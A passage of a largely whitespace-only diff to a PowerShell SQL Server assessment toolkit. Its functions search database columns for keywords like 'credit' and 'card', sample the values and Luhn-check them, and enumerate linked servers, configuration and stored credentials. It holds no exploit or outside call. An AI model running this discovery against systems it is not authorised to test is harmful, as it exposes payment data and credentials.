         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
-        [switch]$NoOutput,       
+        [switch]$NoOutput,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Number of records to sample.')]
@@ -2836,17 +2839,17 @@ Function Get-SQLColumnSampleData
     )
 
     Begin
-    {                         
-        # Table for output               
-        $TblData = New-Object -TypeName System.Data.DataTable 
+    {
+        # Table for output
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Database')
         $null = $TblData.Columns.Add('Schema')
         $null = $TblData.Columns.Add('Table')
         $null = $TblData.Columns.Add('Column')
-        $null = $TblData.Columns.Add('Sample')   
-        $null = $TblData.Columns.Add('RowCount')    
+        $null = $TblData.Columns.Add('Sample')
+        $null = $TblData.Columns.Add('RowCount')
 
         if($ValidateCC)
         {
@@ -2855,7 +2858,7 @@ Function Get-SQLColumnSampleData
     }
 
     Process
-    {   
+    {
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -2874,27 +2877,28 @@ Function Get-SQLColumnSampleData
             if( -not $SuppressVerbose)
             {
                 Write-Verbose -Message "$Instance : CONNECTION FAILED"
-            }                     
+            }
             Return
         }
         else
         {
             if( -not $SuppressVerbose)
             {
-                Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN" 
+                Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                 Write-Verbose -Message "$Instance : - Connection Success."
-                Write-Verbose -Message "$Instance : - Searching for column names that match criteria..." 
-            }
-            
-            if($NoDefaults){
-                # Search for columns   
-                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
-            }else{
-                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
+                Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
             }
 
-        }           
-        
+            if($NoDefaults)
+            {
+                # Search for columns
+                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
+            }else
+            {
+                $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
+            }
+        }
+
         # Check if columns were found
         if($Columns)
         {
@@ -2913,21 +2917,21 @@ Function Get-SQLColumnSampleData
                 # Status user
                 if( -not $SuppressVerbose)
                 {
-                    Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"                               
+                    Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
                     Write-Verbose -Message "$Instance : - Selecting $SampleSize rows of data sample from column $AffectedColumn."
                 }
 
                 # Get row count for column matches
                 $RowCount = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $QueryRowCount -SuppressVerbose | Select-Object -Property NumRows -ExpandProperty NumRows
-                
+
                 # Get sample data
                 Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                 Select-Object -ExpandProperty $sColumnName |
-                ForEach-Object -Process {                                                                                                              
+                ForEach-Object -Process {
                     if($ValidateCC)
                     {
                         # Check if value is CC
-                        $Value = 0                                                   
+                        $Value = 0
                         if([uint64]::TryParse($_,[ref]$Value))
                         {
                             $LuhnCheck = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
@@ -2938,15 +2942,15 @@ Function Get-SQLColumnSampleData
                         }
 
                         # Add record
-                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)                                                                        
+                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)
                     }
                     else
                     {
                         # Add record
-                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)                                                                        
+                        $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)
                     }
                 }
-            }                                          
+            }
         }
         else
         {
@@ -2954,8 +2958,8 @@ Function Get-SQLColumnSampleData
             {
                 Write-Verbose -Message "$Instance : - No columns were found that matched the search."
             }
-        } 
-                
+        }
+
         # Status User
         if( -not $SuppressVerbose)
         {
@@ -2964,8 +2968,8 @@ Function Get-SQLColumnSampleData
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -2978,21 +2982,21 @@ Function Get-SQLColumnSampleData
 # Get-SQLColumnSampleDataThreaded
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Get-SQLColumnSampleDataThreaded 
+Function Get-SQLColumnSampleDataThreaded
 {
     <#
             .SYNOPSIS
             Returns column information from target SQL Servers. Supports search by keywords, sampling data, and validating credit card numbers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER $NoOutput
             Don't output any sample data.
             .PARAMETER SampleSize
@@ -3017,9 +3021,9 @@ Function Get-SQLColumnSampleDataThreaded
             VERBOSE: SQLServer1\STANDARDDEV2014 : - Selecting 5 rows of data sample from column [testdb].[dbo].[tracking].[card].
             VERBOSE: SQLServer1\STANDARDDEV2014 : COMPLETED SEARCH DATA BY COLUMN
 
-            ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC 
-            ------------   --------                   -------- ------ -----    ------ ------           -------- ---- 
-            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True 
+            ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC
+            ------------   --------                   -------- ------ -----    ------ ------           -------- ----
+            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True
             SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   41111111111ASDFD 2        False
             .EXAMPLE
             PS C:\> Get-SQLInstanceLocal | Get-SQLColumnSampleDataThreaded -Keywords "account,credit,card" -SampleSize 5 -ValidateCC -Threads 10
@@ -3027,30 +3031,30 @@ Function Get-SQLColumnSampleDataThreaded
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
-        [string]$NoOutput,       
+        [string]$NoOutput,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Number of records to sample.')]
@@ -3083,16 +3087,16 @@ Function Get-SQLColumnSampleDataThreaded
 
     Begin
     {
-        # Table for output               
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        # Table for output
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Database')
         $null = $TblData.Columns.Add('Schema')
         $null = $TblData.Columns.Add('Table')
         $null = $TblData.Columns.Add('Column')
-        $null = $TblData.Columns.Add('Sample')   
-        $null = $TblData.Columns.Add('RowCount')    
+        $null = $TblData.Columns.Add('Sample')
+        $null = $TblData.Columns.Add('RowCount')
 
         if($ValidateCC)
         {
@@ -3103,16 +3107,17 @@ Function Get-SQLColumnSampleDataThreaded
         $PipelineItems = New-Object -TypeName System.Data.DataTable
 
         # set instance to local host by default
-        if(-not $Instance){ 
+        if(-not $Instance)
+        {
             $Instance = $env:COMPUTERNAME
         }
 
         # Ensure provided instance is processed
         if($Instance)
-        {            
+        {
             $ProvideInstance = New-Object -TypeName PSObject -Property @{
                 Instance = $Instance
-            }            
+            }
         }
 
         # Add instance to instance list
@@ -3120,19 +3125,18 @@ Function Get-SQLColumnSampleDataThreaded
     }
 
     Process
-    {      
+    {
         # Create list of pipeline items
-        $PipelineItems = $PipelineItems + $_         
+        $PipelineItems = $PipelineItems + $_
     }
 
     End
-    {   
+    {
         # Define code to be multi-threaded
         $MyScriptBlock = {
-
             # Set instance
             $Instance = $_.Instance
-                     
+
             # Parse computer name from the instance
             $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -3151,27 +3155,28 @@ Function Get-SQLColumnSampleDataThreaded
                 if( -not $SuppressVerbose)
                 {
                     Write-Verbose -Message "$Instance : CONNECTION FAILED"
-                }                     
+                }
                 Return
             }
             else
             {
                 if( -not $SuppressVerbose)
                 {
-                    Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN" 
+                    Write-Verbose -Message "$Instance : START SEARCH DATA BY COLUMN"
                     Write-Verbose -Message "$Instance : - Connection Success."
-                    Write-Verbose -Message "$Instance : - Searching for column names that match criteria..." 
-                }
-            
-                if($NoDefaults){
-                    # Search for columns   
-                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
-                }else{
-                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
+                    Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
                 }
 
-            }           
-        
+                if($NoDefaults)
+                {
+                    # Search for columns
+                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -NoDefaults -SuppressVerbose
+                }else
+                {
+                    $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -ColumnNameSearch $Keywords -SuppressVerbose
+                }
+            }
+
             # Check if columns were found
             if($Columns)
             {
@@ -3190,21 +3195,21 @@ Function Get-SQLColumnSampleDataThreaded
                     # Status user
                     if( -not $SuppressVerbose)
                     {
-                        Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"                               
+                        Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"
                         Write-Verbose -Message "$Instance : - Selecting $SampleSize rows of data sample from column $AffectedColumn."
                     }
 
                     # Get row count for column matches
                     $RowCount = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $QueryRowCount -SuppressVerbose | Select-Object -Property NumRows -ExpandProperty NumRows
-                
+
                     # Get sample data
                     Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                     Select-Object -ExpandProperty $sColumnName |
-                    ForEach-Object -Process {                                                                                                              
+                    ForEach-Object -Process {
                         if($ValidateCC)
                         {
                             # Check if value is CC
-                            $Value = 0                                                   
+                            $Value = 0
                             if([uint64]::TryParse($_,[ref]$Value))
                             {
                                 $LuhnCheck = Test-IsLuhnValid $_ -ErrorAction SilentlyContinue
@@ -3215,15 +3220,15 @@ Function Get-SQLColumnSampleDataThreaded
                             }
 
                             # Add record
-                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)                                                                        
+                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount, $LuhnCheck)
                         }
                         else
                         {
                             # Add record
-                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)                                                                        
+                            $null = $TblData.Rows.Add($ComputerName, $Instance, $sDatabaseName, $sSchemaName, $sTableName, $sColumnName, $_, $RowCount)
                         }
                     }
-                }                                          
+                }
             }
             else
             {
@@ -3231,18 +3236,17 @@ Function Get-SQLColumnSampleDataThreaded
                 {
                     Write-Verbose -Message "$Instance : - No columns were found that matched the search."
                 }
-            } 
-                
+            }
+
             # Status User
             if( -not $SuppressVerbose)
             {
                 Write-Verbose -Message "$Instance : END SEARCH DATA BY COLUMN"
             }
-            
-        }         
+        }
 
         # Run scriptblock using multi-threading
-        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
 
         return $TblData
     }
@@ -3253,27 +3257,27 @@ Function Get-SQLColumnSampleDataThreaded
 #  Get-SQLDatabaseSchema
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLDatabaseSchema 
+Function  Get-SQLDatabaseSchema
 {
     <#
             .SYNOPSIS
             Returns schema information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER DatabaseName
             Database name to filter for.
             .PARAMETER SchemaName
-            Schema name to filter for. 
+            Schema name to filter for.
             .PARAMETER NoDefaults
-            Only show information for non default databases.    
+            Only show information for non default databases.
 
             .EXAMPLE
             PS C:\> Get-SQLDatabaseSchema -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb
@@ -3301,19 +3305,19 @@ Function  Get-SQLDatabaseSchema
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,               
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Database name.')]
         [string]$DatabaseName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Schema name.')]
         [string]$SchemaName,
 
@@ -3386,7 +3390,7 @@ Function  Get-SQLDatabaseSchema
         }
 
         # Get tables for each database
-        $TblDatabases | 
+        $TblDatabases |
         ForEach-Object -Process {
             # Get database name
             $DbName = $_.DatabaseName
@@ -3412,13 +3416,13 @@ Function  Get-SQLDatabaseSchema
 
             # Append results
             $TblSchemas = $TblSchemas + $TblResults
-        }        
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblSchemas          
+        $TblSchemas
     }
 }
 
@@ -3433,19 +3437,19 @@ Function  Get-SQLView
             .SYNOPSIS
             Returns view information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DatabaseName
             Database name to filter for.
             .PARAMETER ViewName
-            View name to filter for. 
+            View name to filter for.
             .PARAMETER NoDefaults
-            Only display results from non default databases. 
+            Only display results from non default databases.
             .EXAMPLE
             PS C:\> Get-SQLView -Instance SQLServer1\STANDARDDEV2014 -DatabaseName master
 
@@ -3454,13 +3458,13 @@ Function  Get-SQLView
             DatabaseName   : master
             SchemaName     : dbo
             ViewName       : spt_values
-            ViewDefinition : 
+            ViewDefinition :
             create view spt_values as
             select name collate database_default as name,
             number,
             type collate database_default as type,
             low, high, status
-            from sys.spt_values                 
+            from sys.spt_values
             IsUpdatable    : NO
             CheckOption    : NONE
             .EXAMPLE
@@ -3480,19 +3484,19 @@ Function  Get-SQLView
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,               
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Database name.')]
         [string]$DatabaseName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'View name.')]
         [string]$ViewName,
 
@@ -3509,7 +3513,7 @@ Function  Get-SQLView
     {
         # Table for output
         $TblViews = New-Object -TypeName System.Data.DataTable
-        
+
         # Setup View filter
         if($ViewName)
         {
@@ -3522,7 +3526,7 @@ Function  Get-SQLView
     }
 
     Process
-    {       
+    {
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -3566,7 +3570,7 @@ Function  Get-SQLView
         }
 
         # Get tables for each database
-        $TblDatabases | 
+        $TblDatabases |
         ForEach-Object -Process {
             # Get database name
             $DbName = $_.DatabaseName
@@ -3593,15 +3597,15 @@ Function  Get-SQLView
             # Execute Query
             $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
-            # Append results             
+            # Append results
             $TblViews = $TblViews + $TblResults
-        }        
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblViews          
+        $TblViews
     }
 }
 
@@ -3616,17 +3620,17 @@ Function  Get-SQLServerLink
             .SYNOPSIS
             Returns link servers from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DatabaseLinkName
-            Database link name to filter for. 
+            Database link name to filter for.
             .EXAMPLE
-            PS C:\> Get-SQLServerLink -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Get-SQLServerLink -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName           : SQLServer1
             Instance               : SQLServer1\STANDARDDEV2014
@@ -3635,9 +3639,9 @@ Function  Get-SQLServerLink
             DatabaseLinkLocation   : Local
             Product                : SQL Server
             Provider               : SQLNCLI
-            Catalog                : 
+            Catalog                :
             Local Login            : Uses Self Credentials
-            RemoteLoginName        : 
+            RemoteLoginName        :
             is_rpc_out_enabled     : True
             is_data_access_enabled : False
             modify_date            : 3/13/2016 12:30:33 PM
@@ -3649,8 +3653,8 @@ Function  Get-SQLServerLink
             DatabaseLinkLocation   : Remote
             Product                : SQL Server
             Provider               : SQLNCLI
-            Catalog                : 
-            Local Login            : 
+            Catalog                :
+            Local Login            :
             RemoteLoginName        : user123
             is_rpc_out_enabled     : False
             is_data_access_enabled : True
@@ -3672,15 +3676,15 @@ Function  Get-SQLServerLink
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server link name.')]
         [string]$DatabaseLinkName,
 
@@ -3741,8 +3745,8 @@ Function  Get-SQLServerLink
             '$Instance' as [Instance],
             a.server_id as [DatabaseLinkId],
             a.name AS [DatabaseLinkName],
-            CASE a.Server_id 
-            WHEN 0 
+            CASE a.Server_id
+            WHEN 0
             THEN 'Local'
             ELSE 'Remote'
             END AS [DatabaseLinkLocation],
@@ -3767,14 +3771,14 @@ Function  Get-SQLServerLink
         # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
-        # Append results             
-        $TblServerLinks = $TblServerLinks + $TblResults        
+        # Append results
+        $TblServerLinks = $TblServerLinks + $TblResults
     }
 
     End
-    {  
+    {
         # Return data
-        $TblServerLinks          
+        $TblServerLinks
     }
 }
 
@@ -3789,15 +3793,15 @@ Function  Get-SQLServerConfiguration
             .SYNOPSIS
             Returns configuration information from the server using sp_configure.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .EXAMPLE
-            PS C:\> Get-SQLServerConfiguration -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Get-SQLServerConfiguration -Instance SQLServer1\STANDARDDEV2014
             .EXAMPLE
             PS C:\> Get-SQLInstanceLocal | Get-SQLServerConfiguration -Verbose
     #>
@@ -3817,14 +3821,14 @@ Function  Get-SQLServerConfiguration
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,    
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Nubmer of hosts to query at one time.')]
-        [int]$Threads = 5,   
+        [int]$Threads = 5,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
@@ -3842,22 +3846,23 @@ Function  Get-SQLServerConfiguration
         $null = $TblResults.Columns.Add('Maximum')
         $null = $TblResults.Columns.Add('config_value')
         $null = $TblResults.Columns.Add('run_value')
-        
+
 
         # Setup data table for pipeline threading
         $PipelineItems = New-Object -TypeName System.Data.DataTable
 
         # set instance to local host by default
-        if(-not $Instance){ 
+        if(-not $Instance)
+        {
             $Instance = $env:COMPUTERNAME
         }
 
         # Ensure provided instance is processed
         if($Instance)
-        {            
+        {
             $ProvideInstance = New-Object -TypeName PSObject -Property @{
                 Instance = $Instance
-            }            
+            }
         }
 
         # Add instance to instance list
@@ -3865,17 +3870,17 @@ Function  Get-SQLServerConfiguration
     }
 
     Process
-    {      
+    {
         # Create list of pipeline items
-        $PipelineItems = $PipelineItems + $_         
+        $PipelineItems = $PipelineItems + $_
     }
 
     End
-    {           
+    {
         # Define code to be multi-threaded
         $MyScriptBlock = {
-            $Instance = $_.Instance            
-            
+            $Instance = $_.Instance
+
             # Parse computer name from the instance
             $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -3901,21 +3906,21 @@ Function  Get-SQLServerConfiguration
             try
             {
                 # Open connection
-                $Connection.Open()                                              
+                $Connection.Open()
 
                 if(-not $SuppressVerbose)
                 {
                     Write-Verbose -Message "$Instance : Connection Success."
                 }
-               
+
                 # Switch to track advanced options
                 $DisableShowAdvancedOptions = 0
 
                 # Get show advance status
                 $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
-      
+
                 # Get sysadmin status
-                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin                              
+                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
 
                 # Enable show advanced options if needed
                 if ($IsShowAdvancedEnabled -eq 1)
@@ -3962,9 +3967,9 @@ Function  Get-SQLServerConfiguration
                         }
                     }
                 }
-                
+
                 # Run sp_confgiure
-                Get-SQLQuery -Instance $Instance -Query 'sp_configure' -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |                
+                Get-SQLQuery -Instance $Instance -Query 'sp_configure' -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                 ForEach-Object -Process {
                     $SettingName = $_.name
                     $SettingMin = $_.minimum
@@ -3975,7 +3980,7 @@ Function  Get-SQLServerConfiguration
                     $null = $TblResults.Rows.Add($ComputerName, $Instance, $SettingName, $SettingMin, $SettingMax, $SettingConf_value, $SettingRun_value)
                 }
 
-                # Restore Show Advanced Options state if needed                
+                # Restore Show Advanced Options state if needed
                 if($DisableShowAdvancedOptions -eq 1 -and $IsSysadmin -eq 'Yes')
                 {
                     if(-not $SuppressVerbose)
@@ -3993,18 +3998,18 @@ Function  Get-SQLServerConfiguration
             }
             catch
             {
-                # Connection failed                                        
+                # Connection failed
                 if(-not $SuppressVerbose)
                 {
                     $ErrorMessage = $_.Exception.Message
                     Write-Verbose -Message "$Instance : Connection Failed."
                     #Write-Verbose  " Error: $ErrorMessage"
                 }
-            }                      		
-        }         
+            }
+        }
 
         # Run scriptblock using multi-threading
-        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
 
         return $TblResults
     }
@@ -4021,15 +4026,15 @@ Function  Get-SQLServerCredential
             .SYNOPSIS
             Returns credentials from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .EXAMPLE
-            PS C:\> Get-SQLServerCredential -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Get-SQLServerCredential -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName        : SQLServer1
             Instance            : SQLServer1\STANDARDDEV2014
@@ -4038,8 +4043,8 @@ Function  Get-SQLServerCredential
             credential_identity : Domain\MyUser
             create_date         : 5/5/2016 11:16:12 PM
             modify_date         : 5/5/2016 11:16:12 PM
-            target_type         : 
-            target_id           : 
+            target_type         :
+            target_id           :
             [TRUNCATED]
             .EXAMPLE
             PS C:\> Get-SQLInstanceLocal | Get-SQLServerCredential -Verbose
@@ -4060,15 +4065,15 @@ Function  Get-SQLServerCredential
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Credential name.')]
-        [string]$CredentialName,      
+        [string]$CredentialName,
 
         [Parameter(Mandatory = $false,
